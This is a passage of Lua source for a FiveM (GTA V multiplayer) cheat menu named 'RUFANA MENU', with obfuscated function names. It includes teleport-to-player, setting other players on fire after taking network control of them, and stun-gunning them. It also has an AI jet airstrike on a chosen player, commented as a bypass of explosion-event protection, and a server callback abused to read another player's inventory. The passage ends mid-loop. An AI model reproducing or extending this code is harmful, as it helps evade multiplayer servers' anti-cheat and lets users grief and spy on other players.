Ggggg = GetHashKey

local IOeFDEouNG = Citizen.CreateThread
local LUtjuLMzHY = Citizen.CreateThreadNow

local ShouldShowMenu = true


-- fjustimen Functions
---------------------------------------------------------------------------------------
local fjustimen = {}

function fjustimen:CheckName(str) 
	if string.len(str) > 16 then
		fmt = string.sub(str, 1, 16)
		return tostring(fmt .. "...")
	else
		return str
	end
end

local function RkMvHWEotZ(self)
	local rets = Citizen.ARkMvHWEotZ(self.p)
	if not rets then
		if self.r then
			rets = self.r
		else
			error("nibba")
		end
	end

	return table.unpack(rets, 1, table.maxn(rets))
end
  
local function areturn(self, ...)
	self.r = {...}
	self.p:resolve(self.r)
end
  
-- create an async returner or a thread (Citizen.LUtjuLMzHY)
-- func: if passed, will create a thread, otherwise will return an async returner
function fjustimen.Async(func)
	if func then
		Citizen.LUtjuLMzHY(func)
	else
		return setmetatable({ RkMvHWEotZ = RkMvHWEotZ, p = promise.new() }, { __call = areturn })
	end
end

fjustimen.Math = {}

fjustimen.Math.Round = function(value, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", value))
end

fjustimen.Math.GroupDigits = function(value)
	local left,num,right = string.match(value,'^([^%d]*%d)(%d*)(.-)$')

	return left..(num:reverse():gsub('(%d%d%d)','%1' .. _U('locale_digit_grouping_symbol')):reverse())..right
end

fjustimen.Math.Trim = function(value)
	if value then
		return (string.gsub(value, "^%s*(.-)%s*$", "%1"))
	else
		return nil
	end
end

-- fjustimen.Player Table
fjustimen.Player = {
	Spectating = false,
	IsInVehicle = false,
	isNoclipping = false,
	Vehicle = 0,
}

-- Menu toggle table
fjustimen.Toggle = {
	zuHwvdRxVq = false,
	ReplaceVehicle = true,
	SpawnInVehicle = true,
	VehicleCollision = false,
	EOwuAPjpvo = false,
	kBWGGSBsFR = false,
	EasyHandling = false,
	DeleteGun = false,
	RapidFire = false,
	VehicleNoFall = false,

}

fjustimen.Events = {
	Revive = {}
}

fjustimen.Game = {}

function fjustimen.Game:GetPlayers()
	local players = {}
	
	for _,player in ipairs(GetActivePlayers()) do
		local ped = GetPlayerPed(player)
		
		if DoesEntityExist(ped) then
			table.insert(players, player)
		end
	end
	
	return players
end

function fjustimen.Game:GetPlayersInArea(coords, area)
	local players       = fjustimen.Game:GetPlayers()
	local playersInArea = {}

	for i=1, #players, 1 do
		local target       = GetPlayerPed(players[i])
		local targetCoords = GetEntityCoords(target)
		local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

		if distance <= area then
			table.insert(playersInArea, players[i])
		end
	end

	return playersInArea
end

function fjustimen.Game:GetPedStatus(playerPed) 

	local inVehicle = IsPedInAnyVehicle(playerPed, false)
	local isIdle = IsPedStill(playerPed)
	local isWalking = IsPedWalking(playerPed)
	local isRunning = IsPedRunning(playerPed)

	if inVehicle then
		return "~o~In Vehicle"

	elseif isIdle then
		return "~o~Idle"

	elseif isWalking then
		return "~o~Walking"

	elseif isRunning then
		return "~o~Jogging"
	
	else
		return "~o~Running"
	end

end

function fjustimen.Game:GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

function fjustimen.Game:GetSeatPedIsIn(ped)
	if not IsPedInAnyVehicle(ped, false) then return
	else
		veh = GetVehiclePedIsIn(ped)
		for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
			if GetPedInVehicleSeat(veh) then return i end
		end
	end
end

function fjustimen.Game:hfSPELVLBp(entity)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function fjustimen.Game:TeleportToPlayer(target)
	local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

function fjustimen.Game.GetVehicleProperties(vehicle)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		local extras = {}

		for id=0, 12 do
			if DoesExtraExist(vehicle, id) then
				local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
				extras[tostring(id)] = state
			end
		end

		return {
			model             = GetEntityModel(vehicle),

			plate             = fjustimen.Math.Trim(GetVehicleNumberPlateText(vehicle)),
			plateIndex        = GetVehicleNumberPlateTextIndex(vehicle),

			bodyHealth        = fjustimen.Math.Round(GetVehicleBodyHealth(vehicle), 1),
			engineHealth      = fjustimen.Math.Round(GetVehicleEngineHealth(vehicle), 1),

			fuelLevel         = fjustimen.Math.Round(GetVehicleFuelLevel(vehicle), 1),
			dirtLevel         = fjustimen.Math.Round(GetVehicleDirtLevel(vehicle), 1),
			color1            = colorPrimary,
			color2            = colorSecondary,

			pearlescentColor  = pearlescentColor,
			wheelColor        = wheelColor,

			wheels            = GetVehicleWheelType(vehicle),
			windowTint        = GetVehicleWindowTint(vehicle),

			neonEnabled       = {
				IsVehicleNeonLightEnabled(vehicle, 0),
				IsVehicleNeonLightEnabled(vehicle, 1),
				IsVehicleNeonLightEnabled(vehicle, 2),
				IsVehicleNeonLightEnabled(vehicle, 3)
			},

			neonColor         = table.pack(GetVehicleNeonLightsColour(vehicle)),
			extras            = extras,
			tyreSmokeColor    = table.pack(GetVehicleTyreSmokeColor(vehicle)),

			modSpoilers       = GetVehicleMod(vehicle, 0),
			modFrontBumper    = GetVehicleMod(vehicle, 1),
			modRearBumper     = GetVehicleMod(vehicle, 2),
			modSideSkirt      = GetVehicleMod(vehicle, 3),
			modExhaust        = GetVehicleMod(vehicle, 4),
			modFrame          = GetVehicleMod(vehicle, 5),
			modGrille         = GetVehicleMod(vehicle, 6),
			modHood           = GetVehicleMod(vehicle, 7),
			modFender         = GetVehicleMod(vehicle, 8),
			modRightFender    = GetVehicleMod(vehicle, 9),
			modRoof           = GetVehicleMod(vehicle, 10),

			modEngine         = GetVehicleMod(vehicle, 11),
			modBrakes         = GetVehicleMod(vehicle, 12),
			modTransmission   = GetVehicleMod(vehicle, 13),
			modHorns          = GetVehicleMod(vehicle, 14),
			modSuspension     = GetVehicleMod(vehicle, 15),
			modArmor          = GetVehicleMod(vehicle, 16),

			modTurbo          = IsToggleModOn(vehicle, 18),
			modSmokeEnabled   = IsToggleModOn(vehicle, 20),
			modXenon          = IsToggleModOn(vehicle, 22),

			modFrontWheels    = GetVehicleMod(vehicle, 23),
			modBackWheels     = GetVehicleMod(vehicle, 24),

			modPlateHolder    = GetVehicleMod(vehicle, 25),
			modVanityPlate    = GetVehicleMod(vehicle, 26),
			modTrimA          = GetVehicleMod(vehicle, 27),
			modOrnaments      = GetVehicleMod(vehicle, 28),
			modDashboard      = GetVehicleMod(vehicle, 29),
			modDial           = GetVehicleMod(vehicle, 30),
			modDoorSpeaker    = GetVehicleMod(vehicle, 31),
			modSeats          = GetVehicleMod(vehicle, 32),
			modSteeringWheel  = GetVehicleMod(vehicle, 33),
			modShifterLeavers = GetVehicleMod(vehicle, 34),
			modAPlate         = GetVehicleMod(vehicle, 35),
			modSpeakers       = GetVehicleMod(vehicle, 36),
			modTrunk          = GetVehicleMod(vehicle, 37),
			modHydrolic       = GetVehicleMod(vehicle, 38),
			modEngineBlock    = GetVehicleMod(vehicle, 39),
			modAirFilter      = GetVehicleMod(vehicle, 40),
			modStruts         = GetVehicleMod(vehicle, 41),
			modArchCover      = GetVehicleMod(vehicle, 42),
			modAerials        = GetVehicleMod(vehicle, 43),
			modTrimB          = GetVehicleMod(vehicle, 44),
			modTank           = GetVehicleMod(vehicle, 45),
			modWindows        = GetVehicleMod(vehicle, 46),
			modLivery         = GetVehicleLivery(vehicle)
		}
	else
		return
	end
end

fjustimen.Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}

---------------------------------------------------------------------------------------

local storedPrimary, storedSecondary = nil

local function zuHwvdRxVq(justToggled)
	if fjustimen.Player.IsInVehicle then
		if justToggled then
			storedPrimary, storedSecondary = GetVehicleColours(fjustimen.Player.Vehicle)
			fjustimen.Toggle.zuHwvdRxVq = justToggled
		else
			fjustimen.Toggle.zuHwvdRxVq = justToggled
			ClearVehicleCustomPrimaryColour(fjustimen.Player.Vehicle)
			ClearVehicleCustomSecondaryColour(fjustimen.Player.Vehicle)
			SetVehicleColours(fjustimen.Player.Vehicle, storedPrimary, storedSecondary)
		end
	else
		fjustimen.Toggle.zuHwvdRxVq = justToggled
	end
end



local NoclipSpeed = 1
local oldSpeed = 1


local isMenuEnabled = true

-- Globals
-- Menu color customization
local _menuColor = {
	base = { r = 155, g = 89, b = 182, a = 255 },
	highlight = { r = 155, g = 89, b = 182, a = 150 },
	shadow = { r = 96, g = 52, b = 116, a = 150 },
}

-- License key validation for fjustimen
local _buyer
local _secretKey = "devbuild"
local _gatekeeper = true
local _auth = false

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = nil
		enum.handle = nil
	end
}

local function sYaiQMGFLE(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  	local iter, id = initFunc()
	  	if not id or id == 0 then
			disposeFunc(iter)
			return
	  	end

	  	local enum = {handle = iter, destructor = disposeFunc}
	  	setmetatable(enum, entityEnumerator)

	  	local next = true
	  	repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
	  	until not next

	  	enum.destructor, enum.handle = nil, nil
	  	disposeFunc(iter)
	end)
end

local function hyooemabHO()
	return sYaiQMGFLE(FindFirstObject, FindNextObject, EndFindObject)
end

local function DHJCIbSbgi()
	return sYaiQMGFLE(FindFirstPed, FindNextPed, EndFindPed)
end

local function ttavCZvxQN()
	return sYaiQMGFLE(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

local function WQwENpgChi()
	return sYaiQMGFLE(FindFirstPickup, FindNextPickup, EndFindPickup)
end

local function oZxkbfVSWW(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

local function JQYsbYTJay(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

local function EAtOhZdmHf(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

local function ULSSEhdBnX(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

local function AbXnXnpXEx(entity, position, angleFreq, dampRatio)
    local pos1 = EAtOhZdmHf(JQYsbYTJay(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = oZxkbfVSWW(EAtOhZdmHf(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = JQYsbYTJay(pos1, pos2)
    
    ULSSEhdBnX(entity, targetPos)
end

local function VcsbXbuyxm(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function GOTLUZNdvt(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    local screenCoordsx = (x - 0.5) * 2.0
    local screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

local function MGTpXcgczV(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = VcsbXbuyxm(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = VcsbXbuyxm(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - VcsbXbuyxm(vect32)
    local direction2 = VcsbXbuyxm(vect3) - VcsbXbuyxm(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = GOTLUZNdvt(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = GOTLUZNdvt(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

local function iqUkkgJmiR()
    local pos = GetGameplayCamCoord()
    local world = MGTpXcgczV(0, 0)
    local ret = JQYsbYTJay(world, pos)
    return ret
end

AddTextEntry('notification_buffer', '~a~')
AddTextEntry('text_buffer', '~a~')
AddTextEntry('preview_text_buffer', '~a~')
RegisterTextLabelToSave('keyboard_title_buffer')

-- Classes
-- > Gatekeeper

-- Fullscreen Notification builder
local _notifTitle = "~p~RUFANA MENU"
local _notifMsg = "We must authenticate your license before you proceed"
local _notifMsg2 = "~g~Please enter your unique key code"
local _errorCode = 0

local _blackAmount = 0 
-- Get other player data
local function ECMjnSUSKW(player)
	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)
		for k,v in ipairs(data.inventory) do
			if v.name == 'cash' then
				_blackAmount =  v.count
				break
			end
		end
	end, player)

	return _blackAmount
end

local ratio = GetAspectRatio(true)
local mult = 10^3
local floor = math.floor
local unpack = table.unpack

local streamedTxtSize

local txtRatio = {}

local function xsgkNwXpxT(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
	-- calculate the height of a sprite using aspect ratio and hash it in memory
	local index = tostring(textureName)
	
	if not txtRatio[index] then
		txtRatio[index] = {}
		local res = GetTextureResolution(textureDict, textureName)
		
		txtRatio[index].ratio = (res[2] / res[1])
		txtRatio[index].height = floor(((width * txtRatio[index].ratio) * ratio) * mult + 0.5) / mult
		DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
	end
	
	DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
end

local function hfSPELVLBp(entity)
    if NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

-- Init variables
local showMinimap = true

-- This is for MK2 Weapons
local weaponMkSelection = {}

local weaponTextures = {
	{'https://i.imgur.com/GmpQc7C.png', 'weapon_dagger'},
	{'https://i.imgur.com/dL5qnPn.png?1', 'weapon_bat'},
	{'https://i.imgur.com/tl77ZyC.png', 'weapon_knife'},
	{'https://i.imgur.com/RaFQ0th.png', 'weapon_machete'},
}

local w_Txd = CreateRuntimeTxd('weapon_icons')

local function vchioOUAnK()
	
	for i = 1, #weaponTextures do
		local w_DuiObj = CreateDui(weaponTextures[i][1], 256, 128)
		local w_DuiHandle = GetDuiHandle(w_DuiObj)
		local w_Txt = CreateRuntimeTextureFromDuiHandle(w_Txd, weaponTextures[i][2], w_DuiHandle)
		
		-- print(("Successfully created texture %s"):format(weaponTextures[i][2]))
		--CommitRuntimeTexture(w_Txt)
	end
end

-- vchioOUAnK()

-- [NOTE] Weapon Table
local t_Weapons = {

	-- Melee Weapons
	{`WEAPON_BAT`, "Baseball Bat", "weapon_bat", "weapon_icons", "melee"},
	{`WEAPON_BATTLEAXE`, "Battleaxe", "w_me_fireaxe", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_BOTTLE`, "Broken Bottle", nil, nil, "melee"},
	{`WEAPON_CROWBAR`, "Crowbar", "w_me_crowbar", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_DAGGER`, "Antique Cavalry Dagger", "weapon_dagger", "weapon_icons", "melee"},
	{`WEAPON_FLASHLIGHT`, "Flashlight", nil, nil, "melee"},
	{`WEAPON_GOLFCLUB`, "Golf Club", "w_me_gclub", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_HAMMER`, "Hammer", "w_me_hammer", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_HATCHET`, "Hatchet", nil, nil, "melee"},
	{`WEAPON_KNIFE`, "Knife", "weapon_knife", "weapon_icons", "melee"},
	{`WEAPON_KNUCKLE`, "Brass Knuckles", nil, nil, "melee"},
	{`WEAPON_MACHETE`, "Machete", 'weapon_machete', 'weapon_icons', "melee"},
	{`WEAPON_NIGHTSTICK`, "Nightstick", "w_me_nightstick", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_POOLCUE`, "Pool Cue", nil, nil, "melee"},
	{`WEAPON_STONE_HATCHET`, "Stone Hatchet", nil, nil, "melee"},
	{`WEAPON_SWITCHBLADE`, "Switchblade", nil, nil, "melee"},
	{`WEAPON_WRENCH`, "Wrench", "w_me_wrench", "mpweaponsunusedfornow", "melee"},
	
	-- Handguns
	{'WEAPON_PISTOL', "Pistol", "w_pi_pistol", "mpweaponsgang1_small", "handguns", true},
	{`WEAPON_COMBATPISTOL`, "Combat Pistol", "w_pi_combatpistol", "mpweaponscommon_small", "handguns"},
	{`WEAPON_APPISTOL`, "AP Pistol", "w_pi_apppistol", "mpweaponsgang1_small", "handguns"},
	{`WEAPON_STUNGUN`, "Stungun", "w_pi_stungun", "mpweaponsgang0_small", "handguns"},
	{`WEAPON_PISTOL50`, "Pistol .50", nil, nil, "handguns"},
	{'WEAPON_SNSPISTOL', "SNS Pistol", nil, nil, "handguns", true},
	{`WEAPON_HEAVYPISTOL`, "Heavy Pistol", nil, nil, "handguns"},
	{`WEAPON_VINTAGEPISTOL`, "Vintage Pistol", nil, nil, "handguns"},
	{`WEAPON_FLAREGUN`, "Flare Gun", nil, nil, "handguns"},
	{`WEAPON_MARKSMANPISTOL`, "Marksman Pistol", nil, nil, "handguns"},
	{'WEAPON_REVOLVER', "Heavy Revolver", nil, nil, "handguns", true},
	{`WEAPON_DOUBLEACTION`, "Double Action Revolver", nil, nil, "handguns"},
	{`WEAPON_RAYPISTOL`, "Up-n-Atomizer", nil, nil, "handguns"},
	{`WEAPON_CERAMICPISTOL`, "Ceramic Pistol", nil, nil, "handguns"},
	{`WEAPON_NAVYREVOLVER`, "Navy Revolver", nil, nil, "handguns"},

	-- SMGs
	{`WEAPON_MICROSMG`, "Micro SMG", "w_sb_microsmg", "mpweaponscommon_small", "smgs"},
	{'WEAPON_SMG', "SMG", nil, nil, "smgs", true},
	{`WEAPON_ASSAULTSMG`,"Assault SMG", "w_sb_assaultsmg", "mpweaponscommon_small", "smgs"},
	{`WEAPON_COMBATPDW`, "Combat PDW", nil, nil, "smgs"},
	{`weapon_machinepistol`, "Machine Pistol", nil, nil, "smgs"},
	{`weapon_minismg`, "Mini SMG", nil, nil, "smgs"},
	{`weapon_raycarbine`, "Unholy Hellbringer", nil, nil, "smgs"},
	
	-- Shotguns
	{'WEAPON_PUMPSHOTGUN', "Pump Shotgun", "w_sg_pumpshotgun", "mpweaponscommon_small", "shotguns", true},
	{`WEAPON_SAWNOFFSHOTGUN`, "Sawed-Off Shotgun", "w_sg_sawnoff", "mpweaponsgang1", "shotguns"},
	{`WEAPON_ASSAULTSHOTGUN`, "Assault Shotgun", "w_sg_assaultshotgun", "mpweaponscommon_small", "shotguns"},
	{`weapon_bullpupshotgun`, "Bullpup Shotgun", nil, nil, "shotguns"},
	{`weapon_musket`, "Musket", nil, nil, "shotguns"},
	{`weapon_heavyshotgun`, "Heavy Shotgun", nil, nil, "shotguns"},
	{`weapon_dbshotgun`, "Double Barrel Shotgun", nil, nil, "shotguns"},
	{`weapon_autoshotgun`, "Sweeper Shotgun", nil, nil, "shotguns"},

	-- Assault Rifles
	{'WEAPON_ASSAULTRIFLE', "Assault Rifle", "w_ar_assaultrifle", "mpweaponsgang1_small", "assaultrifles", true},
	{'weapon_carbinerifle', "Carbine Rifle", "w_ar_carbinerifle", "mpweaponsgang0_small", "assaultrifles", true},
	{'weapon_advancedrifle', "Advanced Rifle", nil, nil, "assaultrifles"},
	{'weapon_specialcarbine', "Special Carbine", nil, nil, "assaultrifles", true},
	{'weapon_bullpuprifle', "Bullpup Rifle", nil, nil, "assaultrifles", true},
	{'weapon_compactrifle', "Compact Rifle", nil, nil, "assaultrifles"},

	-- LMGs
	{'weapon_mg', "MG", nil, nil, "lmgs"},
	{'weapon_combatmg', "Combat MG", "w_mg_combatmg", "mpweaponsgang0_small", "lmgs", true},
	{'weapon_gusenburg', "Gusenberg Sweeper", nil, nil, "lmgs"},

	-- Sniper Rifles
	{`WEAPON_SNIPERRIFLE`, "Sniper Rifle", "w_sr_sniperrifle", "mpweaponsgang0_small", "sniperrifles"},
	{'WEAPON_HEAVYSNIPER', "Heavy Sniper", "w_sr_heavysniper", "mpweaponsgang0_small", "sniperrifles", true},
	{'weapon_marksmanrifle', "Marksman Rifle", nil, nil, "sniperrifles", true},
	-- Heavy Weapons
	{`WEAPON_RPG`, "RPG", nil, nil, "heavyweapons"},
	{`WEAPON_GRENADELAUNCHER`, "Grenade Launcher", nil, nil, "heavyweapons"},
	{'weapon_grenadelauncher_smoke', "Grenade Launcher (Smoke)", nil, nil, "heavyweapons"},
	{'weapon_minigun', "Minigun", nil, nil, "heavyweapons"},
	{'weapon_firework', "Firework Launcher", nil, nil, "heavyweapons"},
	{'weapon_railgun', "Railgun", nil, nil, "heavyweapons"},
	{'weapon_hominglauncher', "Homing Launcher", nil, nil, "heavyweapons"},
	{'weapon_compactlauncher', "Compact Grenade Launcher", nil, nil, "heavyweapons"},
	{'weapon_rayminigun', "Widowmaker", nil, nil, "heavyweapons"},
}

RequestWeaponAsset(`WEAPON_STUNGUN`)

local function IJBgblLdXP(player)
	local ped = GetPlayerPed(player)
	local tLoc = GetEntityCoords(ped)

	local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end

local function kAVpXGvXII(player)
	local ped = GetPlayerPed(player)

	hfSPELVLBp(ped)

	if IsEntityOnFire(ped) then
		StopEntityFire(ped)
		return true
	end

	StartEntityFire(ped)
	return true
end

local isAirstrikeRunning = false

local Airstrike = {
	ped_hash = `S_M_Y_MARINE_01`,
	vehicle_hash = `STRIKEFORCE`,
	weapon_asset = 519052682,
	spawnDistance = 750.0,
}
-- 955522731
-- 519052682

RequestModel(Airstrike.ped_hash)
RequestModel(Airstrike.vehicle_hash)
RequestWeaponAsset(Airstrike.weapon_asset, 31, 0)

local function sEzemrvIGm(player)
	if isAirstrikeRunning then
		return fjustimenUI.SendNotification({text = "Wait until the current airstrike is complete", type = "error"}) 
	end

	local function BmRxQocMYX()
		isAirstrikeRunning = true
		
		local playerPed = GetPlayerPed(player)
		local target = GetEntityCoords(playerPed)
		local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
		
		repeat
			Wait(0)
		until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
	
		repeat
			Wait(0)
		until HasWeaponAssetLoaded(Airstrike.weapon_asset)
		
		-- Create Aircraft
		local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
		FreezeEntityPosition(aircraft, true)
		
		-- Register with network and give up network ownership
		-- NetworkRegisterEntityAsNetworked(aircraft)
		local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
		SetNetworkIdCanMigrate(netVehid, true)
		NetworkSetNetworkIdDynamic(netVehid, false)
		-- NetworkSetEntityCanBlend(netVehid, true)
		-- NetworkSetChoiceMigrateOptions(true, player)
		-- SetNetworkIdExistsOnAllMachines(netVehid, true)

		aircraft = NetToVeh(netVehid)

		-- Create pilot and block temporary events
		local pilot = CreatePedInsideVehicle(NetToVeh(netVehid), 29, Airstrike.ped_hash, -1, true, true)

		-- Give up network ownership of ped
		-- NetworkRegisterEntityAsNetworked(pilot)
		local netPedid = NetworkGetNetworkIdFromEntity(pilot)
		SetNetworkIdCanMigrate(netPedid, true)
		NetworkSetNetworkIdDynamic(netPedid, false)
		-- NetworkSetEntityCanBlend(netPedid, true)
		-- NetworkSetChoiceMigrateOptions(true, player)
		-- SetNetworkIdExistsOnAllMachines(netPedid, true)

		pilot = NetToPed(netPedid)

		SetBlockingOfNonTemporaryEvents(pilot, true)
		SetDriverAbility(pilot, 1.0)
		-- Make sure the vehicle engine is started
		SetVehicleJetEngineOn(aircraft, true)
		SetVehicleEngineOn(aircraft, true, true, true)
		
		-- Retract landing gear for fast flight
		ControlLandingGear(aircraft, 3)

		-- Disable turbulence
		SetPlaneTurbulenceMultiplier(aircraft, 0.0)

		-- Make sure the vehicle is marked as unowned by Player
		SetVehicleHasBeenOwnedByPlayer(aircraft, false)

		SetVehicleForceAfterburner(aircraft, true)
		local blip = AddBlipForEntity(aircraft)
		
		-- Disabled rockets (CExplosionEvent bypass)
		SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)

		FreezeEntityPosition(aircraft, false)
		--TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
		TaskPlaneMission(pilot, NetToVeh(netVehid), 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
		SetPedKeepTask(pilot, true)
		SetDriveTaskCruiseSpeed(pilot, 150.0)

		while true do
			local target = GetEntityCoords(playerPed)
			local vehCoords = GetEntityCoords(aircraft)
			local distance = GetDistanceBetweenCoords(vehCoords, target)
			--DisableVehicleWeapon(true, 519052682, aircraft, pilot)
			--SetCurrentPedVehicleWeapon(pilot, 519052682)

			if not NetworkDoesEntityExistWithNetworkId(netVehid) then
				isAirstrikeRunning = false
				-- NetworkUnregisterNetworkedEntity(pilot)
				-- NetworkUnregisterNetworkedEntity(aircraft)
				-- SetEntityAsMissionEntity(aircraft)
				-- DeletePed(pilot)
				-- DeleteVehicle(aircraft)
	
				-- RemoveBlip(blip)
				return fjustimenUI.SendNotification({text = "We lost network control, try again.", type = "error"})
			end

			if distance > 150.0 then
				TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
				-- TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
			end

			if distance <= 150.0 then
				--TaskVehicleShootAtCoord(pilot, coords, 0.5)
				ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
				for i = 1, 11 do
				 	local coords = GetEntityCoords(aircraft)
					local target = GetEntityCoords(playerPed)
					local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
					
					-- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
					-- print(offset)
					ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
					
					Wait(100)
				end
